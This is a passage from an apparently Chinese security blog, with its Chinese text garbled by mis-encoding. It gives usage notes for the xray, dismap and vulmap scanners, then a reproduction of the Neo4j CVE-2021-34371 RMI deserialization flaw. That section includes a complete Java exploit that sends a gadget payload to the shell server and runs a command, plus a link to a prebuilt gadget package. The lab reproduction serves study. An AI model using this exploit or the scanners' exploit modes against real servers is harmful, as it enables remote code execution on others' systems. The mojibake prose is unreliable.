<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">httpï¼š</span></span><br><span class="line">	<span class="string">headersï¼š</span></span><br><span class="line">		<span class="string">Cookieï¼škey=value</span></span><br></pre></td></tr></table></figure>



<h3 id="æœåŠ¡æ‰«ææ¨¡å¼"><a href="#æœåŠ¡æ‰«ææ¨¡å¼" class="headerlink" title="æœåŠ¡æ‰«ææ¨¡å¼"></a>æœåŠ¡æ‰«ææ¨¡å¼</h3><p>æ”¯æŒä¸¤ç§æ–¹å¼</p>
<ol>
<li><p>å¿«é€Ÿæ£€æµ‹å•ä¸ªç›®æ ‡<br>   <code>./xray servicescan --target 127.0.0.1:8009</code></p>
</li>
<li><p>æ‰¹é‡æ£€æŸ¥çš„ 1.file ä¸­çš„ç›®æ ‡, ä¸€è¡Œä¸€ä¸ªç›®æ ‡ï¼Œå¸¦ç«¯å£<br>   <code>./xray servicescan --target-file 1.file</code> </p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¾“å‡ºçš„æ–‡ä»¶æ ¼å¼</span><br><span class="line">--html-output [FILE]</span><br><span class="line">--json-output [FILE]</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.xray.cool/#/README">xrayå®˜æ–¹æ–‡æ¡£</a></p>
<h2 id="dismap"><a href="#dismap" class="headerlink" title="dismap"></a><a href="https://github.com/zhzyker/dismap/tree/v0.2">dismap</a></h2><p>è¿™ä¸ªå’Œä¸‹é¢è¿™ä¸ªéƒ½æ˜¯<a href="https://github.com/zhzyker">ä¹‹ä¹è€…ä¹Ÿ</a>å¤§ä½¬å†™çš„ï¼Œdismapä¾§é‡äºèµ„äº§æœé›†ï¼Œæ¯”è¾ƒæ–°çš„ä¸€ä¸ªå·¥å…·ï¼Œä½†æ˜¯å’Œvulmapå¯ä»¥è”åŠ¨ä½¿ç”¨</p>
<p>ä¸»é¡µç»™äº†ä¸€äº›ç®€å•åœ°å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-file string</span><br><span class="line">    Select a URL file for batch identification</span><br><span class="line">    # ä»æ–‡ä»¶ä¸­è¯»å– Url è¿›è¡Œæ‰¹é‡è¯†åˆ«</span><br><span class="line">-ip string</span><br><span class="line">    Network segment [e.g. -ip 192.168.1.0/24 or -ip 192.168.1.1-10]</span><br><span class="line">    # æŒ‡å®šä¸€ä¸ªç½‘æ®µ,æ ¼å¼ç¤ºä¾‹: 192.168.1.1/24  192.168.1.1-100  192.168.1.1-192.168.1.254</span><br><span class="line">-np</span><br><span class="line">    Not use ICMP/PING to detect surviving hosts</span><br><span class="line">    # ä¸è¿›è¡Œä¸»æœºå­˜æ´»æ£€æµ‹,è·³è¿‡å­˜æ´»æ£€æµ‹ç›´æ¥è¯†åˆ« Url</span><br><span class="line">-output string</span><br><span class="line">    Save the scan results to the specified file (default &quot;output.txt&quot;)</span><br><span class="line">    # è‡ªå®šä¹‰è¯†åˆ«ç»“æœè¾“å‡ºæ–‡ä»¶,é»˜è®¤è¿½åŠ åˆ° output.txt ä¸­,æ­¤é€‰é¡¹ä¸­è¾“å‡ºçš„æ–‡ä»¶å¯ä»¥ç›´æ¥é€šè¿‡vulmap -få‚æ•°æ¥æ‰«æ</span><br><span class="line">-port string</span><br><span class="line">    Custom scan ports [e.g. -port 80,443 or -port 1-65535]</span><br><span class="line">    # è‡ªå®šä¹‰éœ€è¦æ‰«æçš„ Web ç«¯å£,é»˜è®¤ç«¯å£åœ¨ /config/config.go ä¸­</span><br><span class="line">-thread int</span><br><span class="line">    Number of concurrent threads, (adapted to two network segments 2x254) (default 508)</span><br><span class="line">    # å¤šçº¿ç¨‹æ•°é‡,é»˜è®¤508(ä¸¤ä¸ªCæ®µçš„æ•°é‡),çº¿ç¨‹è¶Šé«˜å­˜æ´»å’Œè¯†åˆ«ä¸¢å¤±ç‡å¯èƒ½è¶Šé«˜,ä¸å»ºè®®è¶…è¿‡2000</span><br><span class="line">-timeout int</span><br><span class="line">    Response timeout time, the default is 5 seconds (default 5)</span><br><span class="line">    # ä¸»æœºå­˜æ´»æ¢æµ‹å’Œ Http è¶…æ—¶æ—¶é—´,é»˜è®¤å‡ä¸º5ç§’</span><br><span class="line">-url string</span><br><span class="line">    Specify a target URL [e.g. -url https://example.com]</span><br><span class="line">    # è¯†åˆ«å•ä¸ª Url æ—¶ç”¨è¯¥é€‰é¡¹æŒ‡å®š</span><br></pre></td></tr></table></figure>

<p>ç„¶åé€šè¿‡è§„åˆ™åº“å¯ä»¥è‡ªå®šä¹‰è¯†åˆ«çš„æŒ‡çº¹ï¼Œæ‰¹é‡éªŒè¯ï¼Œè§„åˆ™åº“å¾ˆå¥½ä¸Šæ‰‹ï¼Œä¹Ÿåœ¨mdå†™å…¨äº†</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636610888790-2021-11-1114:08:08.png"></p>
<h2 id="vulmap"><a href="#vulmap" class="headerlink" title="vulmap"></a><a href="https://github.com/zhzyker/vulmap">vulmap</a></h2><p>è¿™ä¸ªä¸»è¦æ˜¯æ¼æ´æ‰«æå’ŒéªŒè¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯é€‰å‚æ•°:</span><br><span class="line">  -h, --help            æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º</span><br><span class="line">  -u URL, --url URL     ç›®æ ‡ URL (e.g. -u &quot;http://example.com&quot;)</span><br><span class="line">  -f FILE, --file FILE  é€‰æ‹©ä¸€ä¸ªç›®æ ‡åˆ—è¡¨æ–‡ä»¶,æ¯ä¸ªurlå¿…é¡»ç”¨è¡Œæ¥åŒºåˆ† (e.g. -f &quot;/home/user/list.txt&quot;)</span><br><span class="line">  --fofa keyword        ä½¿ç”¨ fofa api æ‰¹é‡æ‰«æ (e.g. --fofa &quot;app=Apache-Shiro&quot;)</span><br><span class="line">  --shodan keyword      ä½¿ç”¨ shodan api æ‰¹é‡æ‰«æ (e.g. --shodan &quot;Shiro&quot;)</span><br><span class="line">  -m MODE, --mode MODE  æ¨¡å¼æ”¯æŒ&quot;poc&quot;å’Œ&quot;exp&quot;,å¯ä»¥çœç•¥æ­¤é€‰é¡¹,é»˜è®¤è¿›å…¥&quot;poc&quot;æ¨¡å¼</span><br><span class="line">  -a APP [APP ...]      æŒ‡å®š webappsï¼ˆe.g. &quot;weblogic&quot;ï¼‰ä¸æŒ‡å®šåˆ™è‡ªåŠ¨æŒ‡çº¹è¯†åˆ«</span><br><span class="line">  -c CMD, --cmd CMD     è‡ªå®šä¹‰è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ‰§è¡Œçš„å‘½ä»¤,é»˜è®¤æ˜¯echoéšæœºmd5</span><br><span class="line">  -v VULN, --vuln VULN  åˆ©ç”¨æ¼æ´,éœ€è¦æŒ‡å®šæ¼æ´ç¼–å· (e.g. -v &quot;CVE-2019-2729&quot;)</span><br><span class="line">  -t NUM, --thread NUM  æ‰«æçº¿ç¨‹æ•°é‡,é»˜è®¤10çº¿ç¨‹</span><br><span class="line">  --dnslog server       dnslog æœåŠ¡å™¨ (hyuga,dnslog,ceye) é»˜è®¤è‡ªåŠ¨è½®è¯¢</span><br><span class="line">  --output-text file    æ‰«æç»“æœè¾“å‡ºåˆ° txt æ–‡ä»¶ (e.g. &quot;result.txt&quot;)</span><br><span class="line">  --output-json file    æ‰«æç»“æœè¾“å‡ºåˆ° json æ–‡ä»¶ (e.g. &quot;result.json&quot;)</span><br><span class="line">  --proxy-socks SOCKS   ä½¿ç”¨ socks ä»£ç† (e.g. --proxy-socks 127.0.0.1:1080)</span><br><span class="line">  --proxy-http HTTP     ä½¿ç”¨ http ä»£ç† (e.g. --proxy-http 127.0.0.1:8080)</span><br><span class="line">  --user-agent UA       å…è®¸è‡ªå®šä¹‰ User-Agent</span><br><span class="line">  --fofa-size SIZE      fofa api è°ƒç”¨èµ„äº§æ•°é‡ï¼Œé»˜è®¤100ï¼Œå¯ç”¨(1-10000)</span><br><span class="line">  --delay DELAY         å»¶æ—¶æ—¶é—´,æ¯éš”å¤šä¹…å‘é€ä¸€æ¬¡,é»˜è®¤ 0s</span><br><span class="line">  --timeout TIMEOUT     è¶…æ—¶æ—¶é—´,é»˜è®¤ 5s</span><br><span class="line">  --list                æ˜¾ç¤ºæ”¯æŒçš„æ¼æ´åˆ—è¡¨</span><br><span class="line">  --debug               exp æ¨¡å¼æ˜¾ç¤º request å’Œ responses, poc æ¨¡å¼æ˜¾ç¤ºæ‰«ææ¼æ´åˆ—è¡¨</span><br><span class="line">  --check               ç›®æ ‡å­˜æ´»æ£€æµ‹ (on and off), é»˜è®¤æ˜¯ on</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‚æ•°å’Œä¾‹å­éƒ½ç»™çš„å¾ˆå…¨ï¼Œè®°å½•ä¸€ä¸‹åšä¸€ä¸ªå¤‡å¿˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æµ‹è¯•æ‰€æœ‰æ¼æ´ poc ä¸æŒ‡å®š -a all å°†é»˜è®¤å¼€å¯æŒ‡çº¹è¯†åˆ«</span><br><span class="line">python3 vulmap.py -u http://example.com</span><br><span class="line"></span><br><span class="line"># æ£€æŸ¥ç«™ç‚¹æ˜¯å¦å­˜åœ¨ struts2 æ¼æ´</span><br><span class="line">python3 vulmap.py -u http://example.com -a struts2</span><br><span class="line"></span><br><span class="line"># å¯¹ http://example.com:7001 è¿›è¡Œ WebLogic çš„ CVE-2019-2729 æ¼æ´åˆ©ç”¨</span><br><span class="line">python3 vulmap.py -u http://example.com:7001 -v CVE-2019-2729</span><br><span class="line">python3 vulmap.py -u http://example.com:7001 -m exp -v CVE-2019-2729</span><br><span class="line"></span><br><span class="line"># æ‰¹é‡æ‰«æ list.txt ä¸­çš„ url</span><br><span class="line">python3 vulmap.py -f list.txt</span><br><span class="line"></span><br><span class="line"># æ‰«æç»“æœå¯¼å‡ºåˆ° result.json</span><br><span class="line">python3 vulmap.py -u http://example.com:7001 --output-json result.json</span><br><span class="line"></span><br><span class="line"># è°ƒç”¨ fofa api æ‰¹é‡æ‰«æ</span><br><span class="line">python3 vulmap.py --fofa app=Apache-Shiro</span><br></pre></td></tr></table></figure>

<p>è´´ä¸ªè¿è¡Œæˆªå›¾</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636610739920-2021-11-1114:05:39.png"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>æ‰«æå™¨</tag>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤ç°cve-2021-34371</title>
    <url>/2022/06/04/%E5%A4%8D%E7%8E%B0cve-2021-34371/</url>
    <content><![CDATA[<h1 id="é…ç½®ç¯å¢ƒ"><a href="#é…ç½®ç¯å¢ƒ" class="headerlink" title="é…ç½®ç¯å¢ƒ"></a>é…ç½®ç¯å¢ƒ</h1><p>git cloneä»“åº“<a href="https://github.com/neo4j/neo4j/tree/3.4.18">https://github.com/neo4j/neo4j/tree/3.4.18</a></p>
<p>æ³¨æ„åˆ†æ”¯ï¼Œæœ€åæœ‰æ¼æ´çš„ç‰ˆæœ¬æ˜¯3.4.18</p>
<p>æŒ‰ç…§å®˜æ–¹æ•™ç¨‹å®‰è£…</p>
<p><code>mvn clean install</code></p>
<ul>
<li><p><strong>ä¿®æ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œå¼€å¯neo4j-shell</strong>ï¼ˆè§¦å‘æ¼æ´å¿…è¦é…ç½®ï¼‰</p>
<p><code>neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</code>çš„neo4j.conf</p>
<p>ä¿®æ”¹enabledä¸ºtrue</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Enable a remote shell server which Neo4j Shell clients can log in to.</span><br><span class="line">dbms.shell.enabled=true</span><br><span class="line"># The network interface IP the shell will listen on (use 0.0.0.0 for all interfaces).</span><br><span class="line">dbms.shell.host=127.0.0.1</span><br><span class="line"># The port the shell will listen on, default is 1337.</span><br><span class="line">dbms.shell.port=1337</span><br></pre></td></tr></table></figure></li>
</ul>
<p>cdåˆ°<code>packaging/standalone/target</code> è¿è¡Œ<code>bin/neo4j start</code></p>
<p>ç„¶åä¼šçœ‹åˆ°å¯åŠ¨æˆåŠŸçš„æ ‡è¯†ï¼Œè®¿é—®<a href="http://localhost:7474/">http://localhost:7474/</a> æˆåŠŸå³å®‰è£…å®Œæˆ</p>
<p>ï¼ˆä»…å¤ç°å¯ä»¥ä¸éœ€è¦ä»¥ä¸‹æ­¥éª¤ï¼Œç›´æ¥æ‰“payalodå³å¯ï¼‰</p>
<p>è°ƒè¯•æ€è·¯:</p>
<p><strong>ä¸ºäº†å¯ä»¥è°ƒè¯•ï¼Œéœ€è¦è·å–åˆ°ä»–çœŸæ­£çš„å¯åŠ¨å‘½ä»¤ï¼Œè€Œä¸æ˜¯ç›´æ¥ç”¨shellè„šæœ¬å¯åŠ¨</strong></p>
<p><strong>ç„¶åé…ç½®ä¸€ä¸‹è¿œç¨‹å¯åŠ¨ï¼ˆé…åˆè°ƒè¯•ï¼‰</strong></p>
<p>è¿œç¨‹è°ƒè¯•å¯ä»¥çœ‹è¿™ä¸ª<a href="https://www.cnblogs.com/Sincerity/p/11468390.html">https://www.cnblogs.com/Sincerity/p/11468390.html</a></p>
<p>ç›®çš„å°±æ˜¯è®©å‘½ä»¤è¡Œè¿è¡Œçš„javaè™šæ‹Ÿæœºå¯ä»¥è¢«ideaè°ƒè¯•ï¼ˆåœ¨æœ‰æºç çš„æƒ…å†µä¸‹ï¼‰</p>
<span id="more"></span>

<p>å…ˆä»<code>bin/neo4j</code>ä¸­è·å–åˆ°å®é™…å‘½ä»¤è¡Œå¯åŠ¨çš„å‚æ•°</p>
<ol>
<li>è·å–å®é™…è¿è¡Œå‘½ä»¤</li>
</ol>
<p>åœ¨do_start()æ–¹æ³•ä¸­åŠ ä¸€æ¡æ‰“å°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">do_start</span></span>() &#123;</span><br><span class="line">  check_status</span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;NEO4J_PID:-&#125;</span>&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Neo4j is already running (pid <span class="variable">$&#123;NEO4J_PID&#125;</span>).&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Starting Neo4j.&quot;</span></span><br><span class="line"></span><br><span class="line">  check_limits</span><br><span class="line">  build_classpath</span><br><span class="line"></span><br><span class="line">  assemble_command_line</span><br><span class="line">  command_line=(<span class="string">&quot;<span class="variable">$&#123;retval[@]&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;retval[@]&#125;</span>&quot;</span> <span class="comment"># æ·»åŠ ä¸€æ¡è¿™ä¸ªï¼Œç„¶åè§‚å¯Ÿå‘½ä»¤è¡Œè¾“å‡ºå°±å¯ä»¥è·å–åˆ°</span></span><br><span class="line">  nohup <span class="string">&quot;<span class="variable">$&#123;command_line[@]&#125;</span>&quot;</span> &gt;&gt;<span class="string">&quot;<span class="variable">$&#123;CONSOLE_LOG&#125;</span>&quot;</span> 2&gt;&amp;1 &amp;</span><br><span class="line"> <span class="comment"># çœç•¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œ<code>bin/neo4j start</code></p>
<p>å¤§æ¦‚æ˜¯è¿™æ ·çš„ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/harry/.jdks/corretto-1.8.0_322//bin/java -cp /home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/lib/*:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins/*:/home/harry/.jdks/corretto-1.8.0_322//lib/tools.jar </span><br><span class="line">-server -XX:+UseG1GC -XX:-OmitStackTraceInFastThrow -XX:+AlwaysPreTouch -XX:+UnlockExperimentalVMOptions -XX:+TrustFinalNonStaticFields -XX:+DisableExplicitGC </span><br><span class="line">-Djdk.tls.ephemeralDHKeySize=2048 </span><br><span class="line">-Djdk.tls.rejectClientInitiatedRenegotiation=true </span><br><span class="line">-Dunsupported.dbms.udc.source=tarball </span><br><span class="line">-Dfile.encoding=UTF-8 org.neo4j.server.CommunityEntryPoint </span><br><span class="line">--home-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT </span><br><span class="line">--config-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</span><br></pre></td></tr></table></figure>



<p>å› ä¸ºè¦è¿œç¨‹è°ƒè¯•ï¼Œæ‰€ä»¥å¯åŠ¨å‘½ä»¤åŠ ä¸€æ¡jvmé…ç½®<code>-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y</code></p>
<p>å³å¯åŠ¨å‘½ä»¤ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/harry/.jdks/corretto-1.8.0_322//bin/java </span><br><span class="line">-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y</span><br><span class="line">-cp /home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/lib/*:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins/*:/home/harry/.jdks/corretto-1.8.0_322//lib/tools.jar </span><br><span class="line">-server -XX:+UseG1GC -XX:-OmitStackTraceInFastThrow -XX:+AlwaysPreTouch -XX:+UnlockExperimentalVMOptions -XX:+TrustFinalNonStaticFields -XX:+DisableExplicitGC </span><br><span class="line">-Djdk.tls.ephemeralDHKeySize=2048 </span><br><span class="line">-Djdk.tls.rejectClientInitiatedRenegotiation=true </span><br><span class="line">-Dunsupported.dbms.udc.source=tarball </span><br><span class="line">-Dfile.encoding=UTF-8 org.neo4j.server.CommunityEntryPoint </span><br><span class="line">--home-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT </span><br><span class="line">--config-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</span><br></pre></td></tr></table></figure>

<p><strong>è¿™é‡Œæœ‰ä¸ªå‘æ˜¯zshä¸‹æˆ‘æ— æ³•è¿è¡Œè¿™æ¡å‘½ä»¤ï¼Œæ¢æˆbashå°±å¥½äº†</strong></p>
<p>ç„¶åé…ç½®ideaçš„è¿œç¨‹è°ƒè¯•æœ¬åœ°ç«¯å£ï¼Œåœ¨ideaä¸­æ·»åŠ ä¸€ä¸ªdebugé€‰é¡¹</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027089235-2022-4-2710:38:09.png"></p>
<p><code>use module classpath</code>é€‰æ‹©community-build</p>
<h1 id="ç»„è£…exp"><a href="#ç»„è£…exp" class="headerlink" title="ç»„è£…exp"></a>ç»„è£…exp</h1><p>expéœ€è¦è‡ªå·±è£…ä¸€ä¸‹ï¼Œexploit-dbé‡Œé¢å†™çš„å¾ˆæ¸…æ¥šï¼ˆç½‘å€è¯¦è§å‚è€ƒï¼‰</p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨æˆ‘è¿™ä»½ç»„è£…å¥½çš„</p>
<p><a href="https://anonfiles.com/3bhdtaa5ya/rhino_gadget_zip">https://anonfiles.com/3bhdtaa5ya/rhino_gadget_zip</a></p>
<p>è¿™é‡Œè´´ä¸‹exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">////package runnable;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> org.neo4j.shell.ShellServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitB</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public static String COMMAND = &quot;touch /tmp/test.txt&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String COMMAND = <span class="string">&quot;gnome-calculator&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TARGET = <span class="string">&quot;rmi://127.0.0.1:1337&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TARGET_BINDING = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> validBinding = checkBinding(TARGET_BINDING, TARGET);</span><br><span class="line">        <span class="keyword">if</span> (!validBinding)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[-] No valid binding found, shell server may not be listening. Exiting&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Found valid binding, proceeding to exploit&quot;</span>);</span><br><span class="line">        ShellServer server = (ShellServer) Naming.lookup(TARGET + <span class="string">&quot;/&quot;</span> + TARGET_BINDING);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object payload = new RhinoGadget().getObject(COMMAND);</span></span><br><span class="line">        Object payload = Payload.getObject(COMMAND);  <span class="comment">// .getObject(COMMAND);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server.setSessionVariable(newClientId(), <span class="string">&quot;anything_here&quot;</span>, payload);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception UnmarshalException ) &#123;</span><br><span class="line"><span class="comment">//            UnmarshalException.printStackTrace();</span></span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Caught an unmarshalled exception, this is expected.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Exploit completed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Just a helper method to validate that the rmi binding we&#x27;re looking for is present</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bindingToCheck the binding you&#x27;d like to check for</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetToCheck the rmi registry to check against</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true if the binding is present, false if not</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkBinding</span><span class="params">(String bindingToCheck, String targetToCheck)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Trying to enumerate server bindings: &quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RegistryImpl_Stub stub = (RegistryImpl_Stub) Naming.lookup(targetToCheck);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (String element : stub.list()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Found binding: &quot;</span> + element);</span><br><span class="line">                <span class="keyword">if</span> (element.equalsIgnoreCase(bindingToCheck))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Serializable <span class="title">newClientId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>å¯åŠ¨neo4jç„¶åè¿è¡Œexp</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027154337-2022-4-2710:39:15.png"></p>
<h2 id="è°ƒè¯•å®šä½æ¼æ´åŸå› "><a href="#è°ƒè¯•å®šä½æ¼æ´åŸå› " class="headerlink" title="è°ƒè¯•å®šä½æ¼æ´åŸå› "></a>è°ƒè¯•å®šä½æ¼æ´åŸå› </h2><p>è°ƒè¯•äº†åŠå¤©æ²¡æ–­è¿›å»ï¼Œ</p>
<p>çœ‹äº†nvdå¯¹cveçš„æè¿°æ˜¯</p>
<blockquote>
<p>Neo4j through 3.4.18 (with the shell server enabled) exposes an RMI  service that arbitrarily deserializes Java objects, e.g., through  setSessionVariable. An attacker can abuse this for remote code execution because there are dependencies with exploitable gadget chains.</p>
</blockquote>
<p>åŒæ—¶èƒ½æˆåŠŸrceçš„expåœ¨è°ƒç”¨çš„è¿œç¨‹æ–¹æ³•ä¹Ÿæ˜¯<code> server.setSessionVariable(newClientId(), &quot;anything_here&quot;, payload);</code></p>
<p>å¯¹è¿™è¿™ä¸ªå‡½æ•°ç­¾åæ‰¾äº†ä¸€ä¸‹å¯¹åº”çš„æºç ï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027194321-2022-4-2710:39:55.png"></p>
<p>ç„¶ååœ¨è°ƒç”¨ç‚¹éƒ½ä¸‹äº†æ–­ç‚¹ï¼Œä½†æ˜¯æ‰“expçš„æ—¶å€™å¹¶æ²¡æœ‰æ–­è¿›å»</p>
<p>ç„¶åå­¦åˆ°äº†ä¸€ä¸ªå§¿åŠ¿ï¼Œ<strong>ç›´æ¥æŠŠæ–­ç‚¹ä¸‹åœ¨jdkå‘½ä»¤å‘½ä»¤æ‰§è¡Œçš„å†…éƒ¨æ–¹æ³•ä¸Š ï¼Œç„¶åå»è·Ÿè¸ªå †æ ˆä¿¡æ¯</strong></p>
<p>ç›´æ¥æ‰“åœ¨ProcessBuilderçš„startæ–¹æ³•ä¸Š</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027234860-2022-4-2710:40:35.png"></p>
<p>æ–­è¿›æ¥äº†</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027259854-2022-4-2710:41:00.png"></p>
<p>ä½†æ˜¯æ ˆåº•ä¸€å°±æ˜¯jdkå†…éƒ¨çš„è°ƒç”¨ï¼Œæ²¡æœ‰æ–­åˆ°neo4jçš„æºç ç‚¹ä¸Š</p>
<p>ç„¶åè·Ÿäº†ä¸€ä¸‹å¯åŠ¨çš„æµç¨‹å§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¯åŠ¨å¯¼è‡´æ¼æ´çš„neo4j-shell å¼€å¯äº†rmi</span><br><span class="line">load:81, ShellBootstrap (org.neo4j.shell.impl)</span><br><span class="line">start:47, ShellServerKernelExtension (org.neo4j.shell.impl)</span><br><span class="line"># ä»¥ä¸‹ä¸ºå¯åŠ¨åŸºç¡€neo4j</span><br><span class="line">start:445, LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:84, KernelExtensions (org.neo4j.kernel.extension)</span><br><span class="line">start:445, LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">initFacade:208, GraphDatabaseFacadeFactory (org.neo4j.kernel.impl.factory)</span><br><span class="line">newFacade:125, GraphDatabaseFacadeFactory (org.neo4j.kernel.impl.factory)</span><br><span class="line">lambda$static$0:58, CommunityNeoServer (org.neo4j.server)</span><br><span class="line">newGraphDatabase:-1, 85777802 (org.neo4j.server.CommunityNeoServer$$Lambda$107)</span><br><span class="line">start:88, LifecycleManagingDatabase (org.neo4j.server.database)</span><br><span class="line">start:445, 